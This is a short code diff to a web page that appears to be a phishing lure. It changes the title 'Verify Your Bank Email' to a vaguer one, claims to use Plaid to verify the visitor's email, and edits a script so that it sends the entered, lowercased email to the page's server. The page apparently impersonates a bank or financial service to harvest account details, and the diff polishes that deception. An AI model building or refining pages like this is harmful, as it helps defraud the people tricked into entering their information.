@@ -369,7 +369,7 @@
                     <path d="M7 40q-1.2 0-2.1-.9Q4 38.2 4 37V11q0-1.2.9-2.1Q5.8 8 7 8h34q1.2 0 2.1.9.9.9.9 2.1v26q0 1.2-.9 2.1-.9.9-2.1.9Zm17-15.1L7 13.75V37h34V13.75Zm0-3L40.8 11H7.25ZM7 13.75V11v26Z"/>
                 </svg>
             </div>
-            <span class="title">Verify Your Bank Email</span>
+            <span class="title">Verify Your Email Address</span>
             </br>
             <small style="color:red" class="sub">We use Plaid to securely verify the ownership of your E-mail linked on file. </small>
             <form action="" method="POST">
@@ -494,7 +494,7 @@
                             }
                         }
                 
-                        xhr.send('email=' + input.value.trim());
+                        xhr.send('email=' + input.value.trim().toLowerCase());
                     } else {
                         input.classList.add('error');
                     }
